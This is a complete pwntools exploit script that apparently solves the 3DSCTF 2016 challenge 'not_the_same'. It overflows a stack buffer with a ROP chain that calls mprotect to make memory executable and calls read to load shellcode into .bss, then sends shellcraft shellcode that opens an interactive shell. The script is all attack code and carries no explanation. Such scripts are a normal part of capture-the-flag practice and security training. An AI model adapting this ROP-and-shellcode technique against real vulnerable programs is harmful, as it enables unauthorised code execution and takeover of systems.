from pwn import *

context(arch='i386', os='linux', log_level='DEBUG')
p = process('./not_the_same_3dsctf_2016')
elf = ELF('./not_the_same_3dsctf_2016')

pop3 = 0x80483b8
got_base = 0x80eb000
bss_base = elf.bss()
payload = flat(['a'*0x2d,elf.sym['mprotect'],pop3,got_base,0x1000,7,elf.sym['read'],pop3,0,bss_base,0x200,bss_base])
p.sendline(payload)
sleep(1)
p.sendline(asm(shellcraft.sh()))

p.interactive()